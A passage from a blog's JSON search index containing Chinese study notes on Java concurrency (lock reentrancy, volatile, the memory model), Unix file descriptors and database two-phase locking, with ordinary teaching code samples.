http://ifeve.com/from-singleton-happens-before/ 《深入理解 Java 内存模型》读书笔记 - https://segmentfault.com/a/1190000013474307","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Lock】锁的可重入性（Reentrancy）","date":"2019-02-25T04:13:01.000Z","path":"2019/02/25/【Lock】锁的可重入性（Reentrancy）/","text":"可重入性（Reentrant Lock） Java 中的固有锁（intrinsic lock）具有可重入性（Reentrancy），这意味着锁的获取是以每个线程（per-thread）为单位的，而不是每个调用（per-invocation）。 可重入性通过为每个锁关联一个占用计数和当前拥有进程。当计数为 0 时，锁未被持有。 当一个线程获得了一个未被持有的锁时，JVM 会记录锁当前的主人为这个线程，并且将锁的计数+1。 当同样的线程再次申请获得锁时，锁计数会再+1。而当拥有锁的线程退出 synchronized 块时，锁计数-1。最终，当锁计数到达 0 时，锁被释放。 锁的可重入性避免了在某种情况下的死锁（deadlock）。 123456789101112public class Widget &#123; public synchronized void doSomething() &#123; ... &#125; &#125;public class LoggingWidget extends Widget &#123; public synchronized void doSomething() &#123; System.out.println(toString() + \": calling doSomething\"); super.doSomething(); &#125; &#125; 比如，在上面例子中，在一个 synchronized 方法中又调用了另一个 synchronized 方法。如果固有锁不具有可重性，super.doSomething(); 的调用永远不会进入，因为在调用 LoggingWidget 对象的 doSomething() 时，LoggingWidget 类占用锁，因而 LoggingWidget 类的子类 Widget 类无法占用锁， 最终无法进入 Widget 类的 doSomethings()。本质是因为产生了死锁。","comments":true,"categories":[{"name":"Lock","slug":"Lock","permalink":"http://swsmile.info/categories/Lock/"}],"tags":[{"name":"Lock","slug":"Lock","permalink":"http://swsmile.info/tags/Lock/"}]},{"title":"【Java】Java关键字 - volatile 关键字","date":"2019-02-25T02:11:49.000Z","path":"2019/02/25/【Java】Java关键字-volatile关键字/","text":"背景volatile是Java提供的一种轻量级的同步机制。与 synchronized 块相比（synchronized通常称为重量级锁），volatile 变量所需的编码较少，并且运行时开销也较少，但是它所能实现的功能也仅是 synchronized 的一部分。 锁保证了两种主要特性：互斥（mutual exclusion） 和可见性（visibility）： 互斥（mutual exclusion）即一次只允许一个线程持有某个特定的锁，因此可使用该特性实现对共享数据的协调访问协议，这样，一次就只有一个线程能够使用该共享数据。 可见性（visibility）要更加复杂一些，它必须确保释放锁之前，对共享数据做出的更改，对于随后获得该锁的另一个线程是可见的 —— 如果没有同步机制提供的这种可见性保证，线程看到的共享变量可能是修改前的值或不一致的值。 Java 内存模型（Java Memory Model）在说明内存可见性之前，先来简单了解一下 Java 内存模型。 在 Java 虚拟机规范中试图定义一种 Java 内存模型（Java Memory Model，JMM）来屏蔽各个硬件平台和操作系统的内存访问差异，以实现让 Java 程序在各种平台下都能达到一致的内存访问效果。 在 Java 内存模型里，所有变量都是存在主内存（Main memory）中的，而每个线程又包含自己的工作内存（Working memory），所有线程都只能访问自己的工作内存，且工作前后都要将值与主内存中的值进行同步（在执行对变量的操作前，先将值从主内存中读取到自己的工作内存中，在执行对变量的操作后，将新值同步回主内存中）。 以修改一个变量值为例，首先会从主内存中读取变量值，再加载到工作内存中的副本中，然后再传给处理器执行。执行完毕后，再给工作内存中的副本赋值，随后将位于工作内存中这个值同步到主内存中。最终，主内存中的值才得到更新。 volatile 变量volatile 变量具有 synchronized 的可见性（visibility）和部分的有序性（ordering）特性，但是不具备原子性（atomicity）。换句话说，不同的线程总能够获取到 volatile 变量最新的修改值。 总结来说，被 volatile 修饰的共享变量，就具有了以下两点特性： 保证了不同线程对该变量操作的内存可见性（visibility）； 禁止对该共享变量操作本身的指令重排序（instruction reordering）。 可见性（visibility）分析声明为 volatile 的变量可以保证，当多个线程同时对该变量进行读写时，保持可见性（visibility）。 即，当某个线程修改了该变量的值后，新值对于其他线程来说是可以立即感知的（所谓”立即感知”，是指这些其他线程一旦在变量值修改操作完成后，读取这个变量的值，一定获取到的是刚刚被修改后的那个最新值），而普通变量不能做到这一点。 原理本质原理是，当被 volatile 关键字修饰的变量被写操作之后，JVM会向处理器发送一条lock前缀的指令，将这个缓存中的变量回写到主存中。 但是就算写回到内存，如果其他处理器缓存的值还是旧的，再执行计算操作仍会有问题。所以在多处理器下，为了保证各个处理器的缓存是一致的，就会实现缓存一致性协议（Cache Coherence Protocol）。 缓存一致性协议（Cache Coherence Protocol）：每个处理器通过嗅探在总线上传播的数据，来检查自己缓存中是否有值被置为无效了，如果是（这意味着其他的处理器在此前修改了这个共享变量），当处理器要对这个数据进行读取或修改操作时，就强制地重新从主内存中把数据最新的值读到处理器缓存里。 所以，如果一个变量被volatile所修饰的话，在每次数据变化之后，其值都会被强制刷入主存。而其他处理器的缓存由于遵守了缓存一致性协议，（当这些其他处理器需要使用到这个变量时）会从主存中将这个变量最新的值更新到自己的缓存中。这就保证了一个volatile在并发编程中，其值在多个缓存中是可见的。 可见性效果（visibility effects）当一个字段（field）被声明为 volatile 后，对于这个字段的操作均不会被 Java 编译器重排序。 由于存储在 CPU 的寄存器（registers）或者缓存（caches）中的 volatile 变量被修改后，JVM 会将修改同步到主内存中。因此，对于 volatile 变量的读取，将会返回最后被重改写的那个值。 值得注意的是，从可见性效果（visibility effects）的角度而言，声明一个 volatile 变量不仅仅只是作用于这个变量本身。事实上，线程A 更新一个 volatile 变量，此后线程B 读取这个变量的值。当线程B 读取这个变量的值后，对于线程A 在更新 volatile 变量之前，对其他的所有变量的修改，线程B 都是可见的。 原子性（atomicity）分析Volatile 关键字不能保证原子性。 举一个例子： 123456789101112131415161718192021222324252627public class VolatileTest &#123; public static volatile int race = 0; public static void increase() &#123; race++; &#125; private static final int THREADS_COUNT = 20; public static void main(String[] args) &#123; Thread[] threads = new Thread[THREADS_COUNT]; for (int i = 0; i &lt; THREADS_COUNT; i++) &#123; threads[i] = new Thread(new Runnable() &#123; @Override public void run() &#123; for (int i = 0; i &lt; 10000; i++) &#123; increase(); &#125; &#125; &#125;); threads[i].start(); &#125; // 等待所有累加线程都结束 while (Thread.activeCount() &gt; 1) Thread.yield(); System.out.println(race); &#125;&#125; 事实上，这段程序的输出结果是一个小于20000的数字。而且运行它会发现每次运行结果都不一致。 这是因为 volatile 关键字虽然能保证可见性（visibility），但是不能保证原子性（atomicity）。可见性只能保证每次读取 volatile 变量都是获得最新的值，但是 volatile 没办法保证对变量操作的原子性。 分析我们使用 javap 反编译这段代码： 1234567public static void increase(); Code: 0: getstatic #2 // Field race:I 3: iconst_1 4: iadd 5: putstatic #2 // Field race:I 8: return 问题就出现在自增运算 race++ 之中，我们用 javap 反编译这段代码后会发现只有一行代码的 increase() 方法在 Class 文件中是由 4 条字节码指令构成的。 从字节码层面上很容易就分析出并发失败的原因了：当 getstatic 指令把 race 的值取到操作栈顶时，volatile 关键字保证了 race 的值在此时是正确的，但是在执行 iconst_1、iadd 这些指令的时候，其他线程可能已经把 race的值加大了，而在操作栈顶的值就变成了过期的数据，所以 putstatic 指令执行后就可能把较小的 race 值同步回主内存之中。 volatile的使用限制由于 volatile 变量只能保证可见性，在不符合以下两条规则的运算场景中，我们仍然要通过加锁（使用 synchronized 或 java.util.concurrent 中的原子类）来保证原子性。 运算结果并不依赖变量的当前值，或者能够确保只有单一的线程修改变量的值。 变量不需要与其他的状态变量共同参与不变约束。 有序性（ordering）分析Volatile关键字只能保证部分的有序性。 使用 volatile 变量的第二个语义是禁止指令重排序优化（instruction reordering）。 普通的变量仅仅会保证在该方法的执行过程中，所有依赖赋值结果的地方都能获取到正确的结果，而不能保证变量赋值操作的顺序与程序代码中的执行顺序一致。 因为在一个线程的方法执行过程中无法感知到这点， 这也就是 Java 内存模型中描述的所谓的“线程内表现为串行的语义”（Within-Thread As-If-Serial Semantics） 。 例子1123456789101112131415//假设以下代码在线程A中执行//模拟读取配置信息，当读取完成后//将initialized设置为true通知其他线程配置可用configOptions = new HashMap();configText = readConfigFile(flieName);processConfigOptions(configText,configOptions);initialized = true;//假设以下代码在线程B中执行//等待initialized为true,代表线程A已经把配置信息初始化完成while(!initialized)&#123; sleep();&#125;//使用线程A中初始化好的配置信息doSomethingWithConfig(); 在上面的例子中，如果定义 initialized 变量时没有使用 volatile 修饰， 就可能会由于指令重排序的优化，导致线程 A 中最后一句代码 initialized=true 被提前执行，这样线程 B 中使用配置信息的代码就可能出现错误。而使用 volatile 关键字则可以避免此类情况的发生。 例子2 当程序执行到 volatile 变量的读操作或者写操作时，在其前面的操作的更改肯定全部已经进行，且结果已经对后面的操作可见；在其后面的操作肯定还没有进行； 在进行指令优化时，不能将在对 volatile 变量访问的语句放在其后面执行，也不能把在 volatile 变量后面的语句放到其前面执行。 12345678//x、y为非volatile变量//flag为volatile变量 x = 2; //语句1y = 0; //语句2flag = true; //语句3x = 4; //语句4y = -1; //语句5 由于 flag 变量为 volatile 变量，那么在进行指令重排序的过程的时候，不会将语句3 放到语句1、语句2 前面，也不会讲语句3 放到语句4 、语句5 后面。但是要注意语句1 和语句2 的顺序、语句4 和语句5 的顺序是不作任何保证的。 并且 volatile 关键字能保证，执行到语句3 时，语句1 和语句2 必定是执行完毕了的，且语句1 和语句2 的执行结果对语句3、语句4、语句5 是可见的。 volatile 关键字的使用场景volatile 变量可用于提供线程安全，但是只能应用于非常有限的某些场景：多个变量之间或者某个变量的当前值与修改后的值之间没有约束。 因此，单独使用 volatile 无法实现计数器、互斥锁或任何具有与多个变量相关的不变式（Invariants）的类（例如 “start &lt;=end”）。 要使 volatile 变量提供理想的线程安全，必须同时满足下面两个条件： 对变量的写操作不依赖于当前值。 该变量没有包含在具有其他变量的不变式中。 实际上，这些条件表明，可以被写入 volatile 变量的这些有效值独立于任何程序的状态，包括变量的当前状态。 第一个条件的限制使 volatile 变量不能用作线程安全计数器。虽然增量操作（x++）看上去类似一个单独操作，实际上它是一个由读取－修改－写入操作序列组成的组合操作，必须以原子方式执行，而 volatile 不能提供必须的原子特性。实现正确的操作需要使 x 的值在操作期间保持不变，而 volatile 变量无法实现这点。（然而，如果将值调整为只从单个线程写入，那么可以忽略第一个条件。 模式 #1 - 状态标志也许实现 volatile 变量的规范使用仅仅是使用一个布尔状态标志，用于指示发生了一个重要的一次性事件，例如完成初始化或请求停机。 很多应用程序包含了一种控制结构，形式为 “在还没有准备好停止程序时，再执行一些工作”，如下所示： 将 volatile 变量作为状态标志使用123456789volatile boolean shutdownRequested; public void shutdown() &#123; shutdownRequested = true; &#125; public void doWork() &#123; while (!shutdownRequested) &#123; // do stuff &#125;&#125; 上面的这种场景就很适合使用 volatile 变量来控制并发，即当 shutdown() 方法调用时，能保证所有线程中执行的 doWork() 方法都立即停下来。 例如常见的促销活动“秒杀”，可以用 volatile 来修饰“是否售罄”字段，从而保证在并发下，能正确的处理商品是否售罄。 然而，使用 synchronized 块编写循环要比使用上面基于 volatile 状态标志的实现麻烦很多。由于 volatile 简化了编码，并且状态标志并不依赖于程序内任何其他状态，因此此处非常适合使用 volatile。 这种类型的状态标记的一个公共特性是：通常只有一种状态转换；shutdownRequested 标志从 false 转换为 true，然后程序停止。 模式 #2 - 单例模式double check为什么要加volatile关键字，就是为了保证instance的初始化完成之后才会被使用，以免报错。如果不使用，可能会出现，线程A先new了一个对象 分配了内存地址，但是初始化对象的工作没有完成。此时线程B进来，instance不为空。线程B持有instance然后使用的时候报错。 123456789101112131415class Singleton&#123; private volatile static Singleton instance = null; private Singleton() &#123;&#125; public static Singleton getInstance() &#123; if(instance==null) &#123; synchronized (Singleton.class) &#123; if(instance==null) instance = new Singleton(); &#125; &#125; return instance; &#125;&#125; 性能考虑使用 volatile 变量的主要原因是其简易性：在某些情形下，使用 volatile 变量要比使用相应的锁简单得多。使用 volatile 变量次要原因是其性能：某些情况下，volatile 变量同步机制的性能要优于锁。 由于 volatile 变量中并不存在任何锁，因而访问这个变量并不会造成正在执行的线程进入阻塞态。因此，volatile 变量是一种比 synchronized 块更轻量级的同步机制。一句话概括，锁可以保证可见性和原子性，而 volatile 变量只能保证可见性。 在目前大多数的处理器架构上，volatile 读操作开销非常低 —— 几乎和非 volatile 读操作一样。而 volatile 写操作的开销要比非 volatile 写操作多很多，因为要保证可见性需要实现内存界定（Memory Fence），即便如此，volatile 的总开销仍然要比锁获取低。 volatile 操作不会像锁一样造成阻塞，因此，在能够安全使用 volatile 的情况下，volatile 可以提供一些优于锁的可伸缩特性。如果读操作的次数要远远超过写操作，与锁相比，volatile 变量通常能够减少同步的性能开销。 volatile 的实现机制我们来探讨一下volatile到底如何保证可见性和禁止指令重排序的。 观察加入 volatile 关键字和没有加入 volatile 关键字时所生成的汇编代码发现，加入 volatile 关键字时，会多出一个lock前缀指令。 lock 前缀指令实际上相当于一个内存屏障（Memory Barriers），内存屏障会提供3个功能： 它确保指令重排序时不会把其后面的指令排到内存屏障之前的位置，也不会把前面的指令排到内存屏障的后面；即在执行到内存屏障这句指令时，在它前面的操作已经全部完成； 它会强制将对缓存的修改操作立即写入主存； 如果是写操作，它会导致其他 CPU 中对应的缓存行无效。 Reference 《Java Concurrency in Practice》 《深入理解Java虚拟机》 正确使用 Volatile 变量 - https://www.ibm.com/developerworks/cn/java/j-jtp06197.html Java并发编程：volatile关键字解析 - http://www.cnblogs.com/dolphin0520/p/3920373.html volatile关键字详解 - https://zhuanlan.zhihu.com/p/34362413 [深入理解Java中的volatile关键字 - https://www.hollischuang.com/archives/2648","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Operating System】文件描述符（File Descriptor）","date":"2019-02-22T04:53:00.000Z","path":"2019/02/22/【Operating-System】文件描述符/","text":"文件描述符（File Descriptor）文件描述符（File descriptor）是计算机科学中的一个术语，是一个用于表述指向文件的引用的抽象化概念。 文件描述符在形式上是一个非负整数。实际上，它是一个索引值。 操作系统内核为每个进程都维护一张文件描述符表（file descriptor table）以记录着所有的文件描述符 文件描述符（file descriptors）可描述一个文件、数据资源（比如网络socket）或者I/O设备。 当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。但是文件描述符这一概念往往只适用于 UNIX、Linux 这样的操作系统。 文件描述符最初被用于 Unix 中，此后被大部分现代类 Unix 使用，包括Linux, macOS X 和 BSD。在 Windows 中，文件描述符被称为文件句柄（File Handles）。 对于类*nix操作系统，每个进程至少包括三个文件描述符，分别对应于三个标准流，分别是 STDIN (standard input) 、 STDOUT (standard output) STDERR (standard error) 。 Integer value Name &lt;unistd.h&gt; symbolic constant &lt;stdio.h&gt; file stream 0 Standard input STDIN_FILENO stdin 1 Standard output STDOUT_FILENO stdout 2 Standard error STDERR_FILENO stderr 当我们在 Linux 下读取一个文件，而用户权限不足时，会提示 Permission Denied，这会写入到 stderr 中。通过将 file descriptor 2 重定向到/dev/null中，这个提示不会被出现到控制台的屏幕上了。 1find / -name &apos;*something*&apos; 2&gt;/dev/null 基于*nix万物皆文件的哲学，每个物理硬件设备都会在文件系统中体现为一个文件（位于/dev下）。内核以将硬件设备抽象成文件的方式，进而向用户提供统一的设备调用接口。这样，用户就可以直接与硬件设备交互（而无需关心这个设备底层是如何实现这个具体的操作的） 文件描述符与打开文件之间的关系内核维护的3个数据结构 进程级文件描述符表（file descriptor table） 系统级全局文件表（global file table） 文件系统i-node表（i-node table） 每一个文件描述符会与一个打开文件相对应，同时，不同的文件描述符也会指向同一个文件。相同的文件可以被不同的进程打开，也可以在同一个进程中被多次打开。 进程级文件描述符表（file descriptor table）操作系统内核为每个进程都维护一张进程级文件描述符表（file descriptor table）以记录着所有的文件描述符，该表每一条目都记录了单个文件描述符的相关信息，包括： 控制标志（flags），目前内核仅定义了一个，即close-on-exec 打开文件描述体指针 系统级全局文件表（global file table）同时，内核对所有打开的文件的文件维护有一个系统级全局文件表（global file table）。表中各条目称为打开文件描述体（open file description），存储了与一个打开文件相关的全部信息，包括： 文件偏移量（file offset）：调用read()和write()更新，调用lseek()直接修改 状态标示（status flags）：由open()调用设置，例如：只读、只写或非阻塞（nonblocking）等 inode 值 inode表文件系统会为存储于其上的所有文件(包括目录)维护一个 inode 表，每个 inode 节点包含以下信息： 文件类型（file type），可以是常规文件、目录、套接字或FIFO 访问权限 文件锁列表（file locks） 文件大小 等等 inode 存储在磁盘设备上，内核在内存中维护了一个副本，这里的i-node表为后者。副本除了原有信息，还包括：引用计数(从打开文件描述体)、所在设备号以及一些临时属性，例如文件锁。 Reference 《Linux System Programming Talking Directly to the Kernel and C Library》 Wikipedia 文件描述符 - https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6 Lec 21: File System, Kernel Data Structures, and Open Files - https://www.usna.edu/Users/cs/aviv/classes/ic221/s16/lec/21/lec.html File descriptor - https://www.computerhope.com/jargon/f/file-descriptor.htm 每天进步一点点——Linux中的文件描述符与打开文件之间的关系 - https://blog.csdn.net/cywosp/article/details/38965239 Linux文件描述符 - https://www.jianshu.com/p/430340c4a37a","comments":true,"categories":[{"name":"OperatingSystem","slug":"OperatingSystem","permalink":"http://swsmile.info/categories/OperatingSystem/"}],"tags":[{"name":"Operating System","slug":"Operating-System","permalink":"http://swsmile.info/tags/Operating-System/"}]},{"title":"【Database】两阶段锁（Two-phase locking）","date":"2019-02-21T13:18:16.000Z","path":"2019/02/21/【Database】两阶段锁/","text":"注意两阶段锁（Two-phase locking，2PL）需要和两阶段提交（Two-phase commit）区别开来。 两阶段锁（Two-phase locking，2PL）主要用于单机事务中的一致性与隔离性；而两阶段提交（Two-phase commit）主要用于分布式事务。 什么是两阶段加锁（Two-phase locking，2PL）在一个事务中，分为加锁阶段（也称为增长阶段，expanding phase）和解锁阶段（也称为缩减阶段，shrinking phase）。 加锁阶段：所有该事务中涉及的锁都会在这个阶段被获取，且在这个阶段没有锁被释放； 解锁阶段：所有该事务中涉及的锁都会在这个阶段被释放，且在这个阶段没有锁被获； 这意味着，不管同一个事务内需要在多少个数据项上加锁，所有的加锁操作都只能在加锁阶段（增长阶段）完成。在这个阶段内，不允许对已经加锁的数据项进行解锁操作。同时，在加锁完成后，也只能在解锁阶段（缩减阶段）对所有数据项进行解锁。当解锁阶段结束后，所有持有的锁都已经被释放。 对于任何一个数据项而言，分为两种锁： 排他锁/写锁（Exclusive lock，X）：此时数据项既可以被读取也可以被写入（增加、修改和删除）； 共享锁/读锁（Shared lock，S）：此时数据项只能被读取。 这两种锁需要遵循下面的规则： 一个事务对某个数据项的写锁会阻塞另一个事务对该数据项的写锁； 一个事务对某个数据项的写锁会阻塞另一个事务对该数据项的读锁； 一个事务对某个数据项的读锁会阻塞另一个事务对该数据项的写锁； 一个事务对某个数据项的读锁不会阻塞另一个事务对该数据项的读锁； Lock type read-lock write-lock read-lock X write-lock X X 为什么需要两阶段加锁两阶段加锁是一种并发控制（Concurrency Control）的一种手段，除此之外，也可以通过多版本并发控制（Multiversion Concurrency Control）实现。 引入两阶段加锁是为了在保证事务的隔离性（即多个事务在并发的情况下等同于串行的执行）去前提下，尽可能的提高事务的并发度。 为了提高并发度，才对锁进行分类，分出共享锁（读锁）和排它锁（写锁），因这两种类型的锁，又产生加两种锁共四种事务之间受影响的情况： 严格的两阶段锁（Strict two-phase locking）在实际情况下，SQL是千变万化、条数不定的，数据库很难在事务中判定什么是加锁阶段，什么是解锁阶段。于是引入了 Strict-2PL（S2PL）即：在事务中只有提交（commit）或者回滚（rollback）时才是解锁阶段，其余时间为加锁阶段。 Reference MySql-两阶段加锁协议 - https://yq.aliyun.com/articles/626848 浅谈数据库并发控制 - 锁和 MVCC - https://juejin.im/entry/59dc7a3ff265da430c10c623 深度探索数据库并发控制技术 - https://juejin.im/entry/5927d8c42f301e0057cb2a6e","comments":true,"categories":[{"name":"Database","slug":"Database","permalink":"http://swsmile.info/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://swsmile.info/tags/Database/"}]},{"title":"【Programming】并发编程（Concurrent Programming）","date":"2019-02-19T02:45:21.000Z","path":"2019/02/19/【Programming】并发编程/","text":"背景一直以来，硬件的发展极其迅速，也有一个很著名的”摩尔定律”，可能会奇怪明明讨论的是并发编程为什么会扯到了硬件的发展，这其中的关系应该是多核CPU的发展为并发编程提供的硬件基础。摩尔定律并不是一种自然法则或者是物理定律，它只是基于认为观测数据后，对未来的一种预测。按照所预测的速度，我们的计算能力会按照指数级别的速度增长，不久以后会拥有超强的计算能力，正是在畅想未来的时候，2004年，Intel宣布4GHz芯片的计划推迟到2005年，然后在2004年秋季，Intel宣布彻底取消4GHz的计划，也就是说摩尔定律的有效性超过了半个世纪戛然而止。但是，聪明的硬件工程师并没有停止研发的脚步，他们为了进一步提升计算速度，而不是再追求单独的计算单元，而是将多个计算单元整合到了一起，也就是形成了多核CPU。短短十几年的时间，家用型CPU,比如Intel i7就可以达到4核心甚至8核心。而专业服务器则通常可以达到几个独立的CPU，每一个CPU甚至拥有多达8个以上的内核。因此，摩尔定律似乎在CPU核心扩展上继续得到体验。因此，多核的CPU的背景下，催生了并发编程的趋势，通过并发编程的形式可以将多核CPU的计算能力发挥到极致，性能得到提升。 顶级计算机科学家Donald Ervin Knuth如此评价这种情况：在我看来，这种现象（并发）或多或少是由于硬件设计者无计可施了导致的，他们将摩尔定律的责任推给了软件开发者。 另外，在特殊的业务场景下先天的就适合于并发编程。比如在图像处理领域，一张1024X768像素的图片，包含达到78万6千多个像素。即时将所有的像素遍历一边都需要很长的时间，面对如此复杂的计算量就需要充分利用多核的计算的能力。又比如当我们在网上购物时，为了提升响应速度，需要拆分，减库存，生成订单等等这些操作，就可以进行拆分利用多线程的技术完成。面对复杂业务模型，并行程序会比串行程序更适应业务需求，而并发编程更能吻合这种业务拆分 。正是因为这些优点，使得多线程技术能够得到重视，也是一名CS学习者应该掌握的： 充分利用多核CPU的计算能力； 方便进行业务拆分，提升应用性能。 通过多线程实现多程序的同时（simultaneously）执行具有以下好处： 资源利用率（Resource utilization）：程序有时候不得不等待外部的操作（比如I/O），因而在等待时不能进行工作。如果在等待时，让出CPU以让去其他程序执行能够提供整体的资源利用率。 公平（Fairnesss）：让多个程序合理地间断的占用 CPU 时间片，比让一个程序一直执行直到其完成后再让另一个程序执行更公平。 方便（Convenience）：将一个大任务中多个小任务分配给多个程序去执行，且程序之间进行协作，比使用一个程序去完成这个大任务更合理。 线程（thread）是最简单的充分开启多处理器（multiprocesssor）系统计算能力的方式。 并发编程有哪些缺点多线程技术有这么多的好处，难道就没有一点缺点么，就在任何场景下就一定适用么？很显然不是。 频繁的上下文切换时间片是CPU分配给各个线程的时间，因为时间非常短，所以CPU不断通过切换线程，让我们觉得多个线程是同时执行的，时间片一般是几十毫秒。而每次切换时，需要保存当前的状态起来，以便能够进行恢复先前状态，而这个切换时非常损耗性能，过于频繁反而无法发挥出多线程编程的优势。通常减少上下文切换可以采用无锁并发编程，CAS算法，使用最少的线程和使用协程。 无锁并发（lock free）编程：可以参照 ConcurrentHashMap 锁分段的思想，不同的线程处理不同段的数据，这样在多线程竞争的条件下，可以减少上下文切换的时间。 CAS 算法，利用 Atomic 下使用 CAS 算法来更新数据，使用了乐观锁（pessimistic locking），可以有效的减少一部分不必要的锁竞争带来的上下文切换。 使用最少线程：避免创建不需要的线程，比如任务很少，但是创建了很多的线程，这样会造成大量的线程都处于等待状态（从本质来说，是就绪状态（Ready），因而不能获得 CPU 时间片） 协程（coroutine）：在单线程里实现多任务的调度，并在单线程里维持多个任务间的切换 由于上下文切换也是个相对比较耗时的操作，所以在”java并发编程的艺术”一书中有过一个实验，并发累加未必会比串行累加速度要快。 通过Lmbench3 可以测量上下文切换的时长 ，而 vmstat 可以测量上下文切换次数。 并发编程中的三个概念在并发编程中，我们通常会遇到以下三个问题：原子性问题，可见性问题，有序性问题。我们先看具体看一下这三个概念： 1 原子性（Atomicity）原子性（Atomicity），即一个操作或者多个操作，要么全部执行并且执行的过程不会被任何因素打断，要么就都不执行。 但是很多操作不能通过一条指令就完成。 例子1 - long类型例如，对 long 类型的运算，很多系统就需要分成多条指令分别对高位和低位进行操作才能完成。 12345678910111213@NotThreadSafe public class UnsafeCountingFactorizer implements Servlet &#123; private long count = 0; public long getCount() &#123; return count; &#125; public void service(ServletRequest req, ServletResponse resp) &#123; BigInteger i = extractFromRequest(req); BigInteger[] factors = factor(i); ++count; encodeIntoResponse(resp, factors); &#125;&#125; 在上面的例子中，由于 UnsafeCountingFactorizer 不算是线程安全的，而且这是一个典型的读-更新-写操作（read-modify-write）操作，因此当运行在多线程的环境下，可能会出现丢失更新（lost update）的情况。 从本质来说，发生丢失更新是因为多个线程同时进入了临界区（critical regions），因而发生了竞争条件（race condition）。 解决一种解决方案，是为整个复合操作（compound action）加锁，以保证原子性。比如通过 Java 内置的锁实现同步，比如 synchronized，他们被称为固有锁/内置锁（intristic locks）或管程锁（monitor locks），Java 中的固有锁（intristic locks）均为互斥锁（mutexes）。 另一种解决，是通过利用 java.util.concurrent.atomic 包中提供的原子变量类。通过将 long 类型替换为 AtomicLong，最终保证计数的原子性。 1234567891011121314@ThreadSafepublic class CountingFactorizer implements Servlet &#123; private final AtomicLong count = new AtomicLong(0); public long getCount() &#123; return count.get(); &#125; public void service(ServletRequest req, ServletResponse resp) &#123; BigInteger i = extractFromRequest(req); BigInteger[] factors = factor(i); count.incrementAndGet(); encodeIntoResponse(resp, factors); &#125;&#125;s 例子2 - i++还比如，我们经常使用的整数 i++ 的操作，其实需要分成三个步骤： 读取整数 i 的值； 对 i 进行加一操作； 将结果写回内存。 这个过程在多线程下就可能出现如下现象： 对于这种组合操作，要保证原子性，最常见的方式是加锁，如 Java 中的synchronized 或 Lock 都可以实现， 2 可见性（Visibility）可见性（Visibility）是指当多个线程访问同一个变量时，一个线程修改了这个变量的值，其他线程能够立即看得到修改的值。 举一个例子来说明： 123456//线程1执行的代码int i = 0;i = 10; //线程2执行的代码j = i; 假若线程 1 在被 CPU1 执行，而线程 2 在被 CPU2 执行。由上面的分析可知，当线程 1 执行 i =10 这句时，会先把 i 的初始值加载到 CPU1 的高速缓存中，然后赋值为 10，那么在 CPU1 的高速缓存当中 i 的值变为 10 了，却没有立即写入到主存当中。 此时，线程 2 执行 j = i，它会先去主存读取 i 的值，并加载到 CPU2 的高速缓存当中。注意，此时内存中 i 的值还是 0，那么就会使得 j 的值也为0，而不是 10. 这就是可见性问题，线程 1 对变量 i 修改了之后，线程 2 没有立即看到线程 1 修改的值。 没有同步机制的读取数据类似于在数据库中使用 READ_UNCOMITTED 隔离级别（isolation level），以获得更优的数据库性能。然而，前者的执行结果更不可预知。 非原子的 64 位操作（Nonatomic 64-bit operations）当一个线程读取一个变量，同时不使用同步机制时，尽管可能获得一个过期的值，但是仍是其中的某一个线程提供的，而不是一个随机值（random）。 其中有两个例外，类型为 double 或者 long 且没有被声明为 volatile 的变量。这是因为，JVM 会将一个 64 位的读或写操作当做是两个独立的 32 为操作。 因此，只有当可变且类型为 long 或 double 的变量被声明为 volatile时，原子性才能得到保障。 锁与可见性如下图所示，当线程A 执行 synchronized 块，之后线程B 进入 sychronized 块，且他们都基于同一个锁对象，在线程B 获得锁时，线程A （在未获得锁之前和持有锁的两个过程中）对所有变量的修改，对于线程B 都是可见的。 换句话说， volatile 变量当一个字段（field）被声明为 volatile 后，对于这个字段的操作均不会被 Java 编译器重排序。 由于 volatile 变量不会被缓存在当前执行 CPU 的寄存器（registers）或者缓存（caches）中，对于 volatile 变量的读取，将会返回最后被任何一个线程重改写的那个值。 值得注意的是，从可见性效果（visibility effects）的角度而言，声明一个 volatile 变量不仅仅只是作用于这个变量本身。事实上，线程A 更新一个 volatile 变量，此后线程B 读取这个变量的值。当线程B 读取这个变量的值后，对于线程A 在更新 volatile 变量之前，对其他的所有变量的修改，线程B 都是可见的。 另外，由于 volatile 变量中并不存在任何锁，因而访问这个变量并不会造成正在执行的线程进入阻塞态。因此，volatile 变量是一种比 synchronized 块更轻量级的同步机制。一句话概括，锁可以保证可见性和原子性，而 volatile 变量只能保证可见性。 3 有序性（Ordering）有序性（Ordering），即程序执行的顺序按照代码的先后顺序执行。 举个简单的例子，看下面这段代码： 123456int i = 0; boolean flag = false;//语句1i = 1; //语句2flag = true; 上面代码定义了一个 int 型变量，定义了一个 boolean 类型变量，然后分别对两个变量进行赋值操作。从代码顺序上看，语句1是在语句2前面的，那么JVM在真正执行这段代码的时候会保证语句1一定会在语句2前面执行吗？不一定，为什么呢？这里可能会发生指令重排序（Instruction Reorder）。 事实上，处理器为了提高程序运行效率，可能会对输入代码进行优化，它不保证程序中各个语句的执行先后顺序同代码中的顺序一致，但是它会保证程序最终执行结果和代码顺序执行的结果是一致的。 比如上面的代码中，语句1和语句2谁先执行对最终的程序结果并没有影响，那么就有可能在执行过程中，语句2先执行而语句1后执行。 但是要注意，虽然处理器会对指令进行重排序，但是它会保证程序最终结果会和代码顺序执行结果相同，那么它靠什么保证的呢？再看下面一个例子： 12345678//语句1int a = 10;//语句2int r = 2;//语句3a = a + 3;//语句4r = a * a; 这段代码有4个语句，那么可能的一个执行顺序是： 那么可不可能是这个执行顺序呢： 语句2 语句1 语句4 语句3 不可能，因为处理器在进行重排序时是会考虑指令之间的数据依赖性，如果一个指令Instruction 2必须用到Instruction 1的结果，那么处理器会保证Instruction 1会在Instruction 2之前执行。 虽然重排序不会影响单个线程内程序执行的结果，但是多线程呢？下面看一个例子： 1234567891011//线程1://语句1context = loadContext(); //语句2 inited = true; //线程2:while(!inited )&#123; sleep()&#125;doSomethingwithconfig(context); 